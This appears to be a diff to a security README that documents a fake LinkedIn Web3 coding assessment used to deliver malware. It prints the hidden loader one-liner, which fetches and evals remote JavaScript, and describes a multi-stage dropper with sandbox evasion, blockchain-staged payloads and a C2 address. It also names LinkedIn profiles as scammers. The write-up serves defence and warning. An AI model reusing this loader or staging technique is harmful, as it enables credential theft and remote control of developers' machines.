@@ -56,6 +56,7 @@ The code is kept for educational and research purposes only.
   - [16. ACNPlay-Demo (0xroaman Campaign)](#16-acnplay-demo-0xroaman-campaign)
   - [17. Novaremix Vault (novaremix-vault-zoom)](#17-novaremix-vault-novaremix-vault-zoom)
   - [18. HotCarMint / MotorMint (fake Web3 vehicle marketplace)](#18-hotcarmint--motormint-fake-web3-vehicle-marketplace)
+  - [19. MiIies/mvp (fake Web3 coding assessment, multi-stage dropper)](#19-miiiesmvp-fake-web3-coding-assessment-multi-stage-dropper)
 - [Checking for Malicious npm Packages](#checking-for-malicious-npm-packages)
 
 ## Known Scam Repos and APIs
@@ -85,6 +86,10 @@ The code is kept for educational and research purposes only.
 - `hxxps://api[.]jsonbin[.]io/v3/b/6a7af29df5f4af5e290685a0`
 - `hxxp://130[.]94[.]92[.]170`
 - `hxxp://65[.]109[.]105[.]95:4552`
+- `hxxps://github[.]com/MiIies/mvp`
+- `hxxps://lavifo[.]shorts[.]gy/ETKfJ`
+- `hxxps://yellow-written-hyena-360[.]mypinata[.]cloud/ipfs/bafkreiadf6x4tg3ozizmkw2eirvy6odcahrzznyblfmcnjw3lvbbdt3u2u`
+- `hxxp://138[.]226[.]247[.]152/session/`
   
 ### Known scammer recruiter profiles
 
@@ -112,8 +117,15 @@ The code is kept for educational and research purposes only.
 - [Cecilia Díaz Cruz](https://www.linkedin.com/in/ceciliadic/) (Innovation Lead & Executive | Co-Founder & CEO | IT & Business Strategy Management)
 - [Karem Emad](https://www.linkedin.com/in/karem-emad-813927402)
 - [Zakhar H](https://www.linkedin.com/in/zakhar-h-5a7b3a269/) (account used in the HotCarMint recruitment campaign; the underlying person/account may have been compromised)
+- [Hanan Nurul Azka](https://www.linkedin.com/in/hananazka) ("Blockchain Recruiter | Digital Marketing Strategist"; sent the MiIies/mvp fake assessment, and was already named in a [July 2025 warning](https://www.linkedin.com/pulse/important-warning-fellow-software-engineers-alexandre-colauto-neto-rk2uf/); still active in October 2026)
 
 ## Extra Links
+
+- [Important Warning to fellow Software Engineers - on Linkedin (July 2025)](https://www.linkedin.com/pulse/important-warning-fellow-software-engineers-alexandre-colauto-neto-rk2uf/)
+
+- [Anatomy of a Fake LinkedIn Coding Test: A Malware Dropper Hidden in a .tiff](https://antlis.is-a.dev/blog/linkedin-fake-assessment-malware/) (analysis of section 19, part 2 of [LinkedIn DeFi Scammers](https://antlis.is-a.dev/blog/linkedin-defi-scammers/))
+
+- [Fake coding test with a malware dropper in a .tiff - on Linkedin](https://www.linkedin.com/feed/update/urn:li:share:7518071483286519808/)
 
 - [Kathleen Anays Lewis Barrios](https://www.linkedin.com/in/kathleen-anays-lewis-barrios-9a61bb273/)
 
@@ -1063,6 +1075,42 @@ https://jsonkeeper.com/b/GUIIX
 > ⚠️ **DO NOT RUN.** The JavaScript payload and `RemoteDesk-Agent.exe` are captured malicious artifacts. Analyze statically or only inside an isolated malware-analysis environment with networking disabled or tightly controlled.
 
 ---
+
+### 19. MiIies/mvp (fake Web3 coding assessment, multi-stage dropper)
+
+Reported October 2026. A LinkedIn "recruiter" offered a remote Web3 NFT minting/staking role at $40/hr without naming a company, did not answer questions about the interview process or payment, then asked for a "5–10 minute" screen-recorded assessment ("please don't use AI tools") in a GitHub repository. The tasks were trivial (print "Hello" when the backend starts, change border and background colors), but the first one requires starting the backend, which triggers the loader.
+
+Located in `MiIies-mvp/` (lockfiles removed); the recovered later stages are in `MiIies-mvp-stages/` as inert `.txt` files. Full write-up: [Anatomy of a Fake LinkedIn Coding Test](https://antlis.is-a.dev/blog/linkedin-fake-assessment-malware/). The reporter did not clone or run the project; everything below comes from static reading and from fetching inert data through Tor.
+
+**Social-engineering infrastructure**
+
+| Asset | Detail |
+|-------|--------|
+| LinkedIn account used | [Hanan Nurul Azka](https://www.linkedin.com/in/hananazka) ("Blockchain Recruiter \| Digital Marketing Strategist") |
+| Earlier public warning naming the account | [July 2025 LinkedIn post](https://www.linkedin.com/pulse/important-warning-fellow-software-engineers-alexandre-colauto-neto-rk2uf/) (the account was still active in October 2026) |
+| Delivery | Repository link sent in a LinkedIn message; Loom recording requested |
+
+**Malicious repository**
+
+- Repository: `https://github.com/MiIies/mvp` (owner name uses a capital `I` in place of an `l`)
+- Single commit: `4b9c81a5d0c73ac1f87e2d42f594b68d905e935f` ("initial commit", 2025-12-12, unsigned), author `daudmag` <`daudhashi631@gmail.com`>
+- Malicious file: `server/_resources/html_css_theme/img/w.tiff` (JavaScript disguised as an image, 158 bytes, SHA-256 `8e1737980b244fa91fca17617ee1519d8fa03f97d157f4365d737e9031547b7b`)
+- Trigger: `server/routes/api/faq.js:84` does `require('../../_resources/html_css_theme/img/w.tiff')`, and `server/server.js` mounts that route, so starting the backend (`npm run server` / `npm start`) runs it. There is no install hook in `package.json`.
+
+```javascript
+try { (async () => { const res = await require('axios').get(atob('aHR0cHM6Ly9sYXZpZm8uc2hvcnRzLmd5L0VUS2ZK')); eval(res.data.content); })(); } catch (err) { }
+```
+
+**Execution chain**
+
+1. `w.tiff` fetches `hxxps://lavifo[.]shorts[.]gy/ETKfJ`, which returns a 301 redirect to a Pinata IPFS file (CID `bafkreiadf6x4tg3ozizmkw2eirvy6odcahrzznyblfmcnjw3lvbbdt3u2u`, 35,247 bytes, SHA-256 `032fafc99b6eca32c55b44446b8f386201e39cb701595826a6db5d4211cf74d5`) and `eval()`s its `content` field.
+2. Stage 1 (obfuscator.io style) exits with a fake "environment not supported" message if it sees cloud/CI/sandbox environment variables (Codespaces, Vercel, AWS, Docker, etc.). Otherwise it creates `~/.vs_cache/`, writes `package.json`, `main.js` and, on Windows, `main.vbs` (run hidden through `wscript.exe`), and runs `npm install` for `koffi`, `@primno/dpapi`, `better-sqlite3`, `socket.io-client` and `node-machine-id`.
+3. Stage 2 (`main.js`, SHA-256 `fe0ffbbde5b46b1cf17429c26f485d5d6201d6d763cba1975259590abcdc27b9`) reads the latest outgoing transaction of TRON address `TBMcSRezuxdoNEC8gD3uS4GQVGvybYU4UU`. Its memo (halves swapped, hex-decoded) is a BSC transaction hash, `0xbf3fa7a35ab2ee7e243134f39e367b8774d32810fd9b66355c8eba135b2fca9f`. That transaction's input data is reversed, XORed with `02e4f3e7-9442-4f9c-a6f4-4fa136605d1c`, stripped of the `BCGZ1|` marker, base64-decoded, gunzipped and run with `new Function`.
+4. Stage 3 (SHA-256 `1856068cc3960e23df6ef4f8599332e30a58154f1dbb243e0839594e32e6648a`) fetches more JavaScript from `hxxp://138[.]226[.]247[.]152:80/session/<token>` and logs to `~/.vs_cache/loader.log`. Without a valid session the server (Express) answers `404 Session not found`.
+
+**Not established:** the final stage-4 payload was not obtained, so what it steals is unknown. The dependency list (`@primno/dpapi`, `better-sqlite3`, `node-machine-id`, `socket.io-client`) points to browser/credential theft and remote control, but that is inference. Because the next stage is delivered through blockchain transactions, it can be rotated without changing the repository.
+
+If you ran this project, treat the machine as compromised: look for `~/.vs_cache/` and unexpected `wscript.exe`/`node` processes, and rotate credentials and wallets from a clean device.
 
 ## Checking for Malicious npm Packages
 
